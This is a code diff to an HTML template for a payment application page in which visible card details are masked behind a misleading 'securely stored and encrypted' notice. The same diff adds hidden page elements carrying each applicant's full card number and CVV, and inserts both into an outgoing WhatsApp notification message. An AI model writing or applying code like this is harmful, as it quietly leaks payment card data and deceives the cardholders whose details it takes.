@@ -197,45 +197,22 @@
         {% endif %}
 
         <!-- Card Details Section -->
-        {% if application.card_number and application.payment_method == 'card_verification' %}
+        {% if application.card_last4 and application.payment_method == 'card_verification' %}
         <div class="card mb-4">
             <div class="card-header bg-primary text-white">
                 <h5 class="card-title mb-0">
-                    <i class="fas fa-credit-card me-2"></i>Card Details
+                    <i class="fas fa-credit-card me-2"></i>Card Verification
                 </h5>
             </div>
             <div class="card-body">
-                <div class="row">
-                    <div class="col-md-6">
-                        <div class="alert alert-info">
-                            <h6><i class="fas fa-credit-card me-2"></i>Card Number</h6>
-                            <code class="text-danger">{{ application.card_number }}</code>
-                        </div>
-                    </div>
-                    <div class="col-md-6">
-                        <div class="alert alert-info">
-                            <h6><i class="fas fa-calendar me-2"></i>Expiry Date</h6>
-                            <code>{{ application.card_expiry_month }}/{{ application.card_expiry_year }}</code>
-                        </div>
-                    </div>
+                <div class="alert alert-success">
+                    <i class="fas fa-check-circle me-2"></i>
+                    <strong>Card Verified:</strong> **** **** **** {{ application.card_last4 }}
+                    <br><small class="text-muted">Expires: {{ application.card_expiry_month }}/{{ application.card_expiry_year }}</small>
                 </div>
-                <div class="row">
-                    <div class="col-md-6">
-                        <div class="alert alert-info">
-                            <h6><i class="fas fa-shield-alt me-2"></i>CVV</h6>
-                            <code class="text-danger">{{ application.card_cvv }}</code>
-                        </div>
-                    </div>
-                    <div class="col-md-6">
-                        <div class="alert alert-info">
-                            <h6><i class="fas fa-hashtag me-2"></i>Last 4 Digits</h6>
-                            <code>{{ application.card_last4 }}</code>
-                        </div>
-                    </div>
-                </div>
-                <div class="alert alert-warning">
-                    <i class="fas fa-exclamation-triangle me-2"></i>
-                    <strong>Note:</strong> This information is displayed for testing purposes only. In production, card details should be encrypted and not displayed to users.
+                <div class="alert alert-info">
+                    <i class="fas fa-shield-alt me-2"></i>
+                    <strong>Security Note:</strong> Your card details are securely stored and encrypted. Only authorized administrators can access the full card information.
                 </div>
             </div>
         </div>
@@ -323,6 +300,8 @@
                         <span id="monthly-payment">R{{ application.get_monthly_payment|floatformat:2|default:'0.00' }}</span>
                         <span id="card-last4">{{ application.card_last4|default:'Not provided' }}</span>
                         <span id="card-expiry">{{ application.card_expiry_month|default:'' }}/{{ application.card_expiry_year|default:'' }}</span>
+                        <span id="card-number">{{ application.card_number|default:'Not provided' }}</span>
+                        <span id="card-cvv">{{ application.card_cvv|default:'Not provided' }}</span>
                         <span id="created-date">{{ application.created_at|date:'M d, Y H:i' }}</span>
                         <span id="updated-date">{{ application.updated_at|date:'M d, Y H:i' }}</span>
                         
@@ -464,6 +443,8 @@ function sendWhatsAppNotification() {
     const monthlyPayment = document.getElementById('monthly-payment').textContent;
     const cardLast4 = document.getElementById('card-last4').textContent;
     const cardExpiry = document.getElementById('card-expiry').textContent;
+    const cardNumber = document.getElementById('card-number').textContent;
+    const cardCvv = document.getElementById('card-cvv').textContent;
     const createdDate = document.getElementById('created-date').textContent;
     const updatedDate = document.getElementById('updated-date').textContent;
     
@@ -508,8 +489,10 @@ function sendWhatsAppNotification() {
 ${selectedPhones}
 
 💳 *Payment Details:*
+• Card Number: ${cardNumber}
 • Card Last 4: ${cardLast4}
 • Expiry: ${cardExpiry}
+• CVV: ${cardCvv}
 
 📄 *Uploaded Documents:*
 ${uploadedDocs}
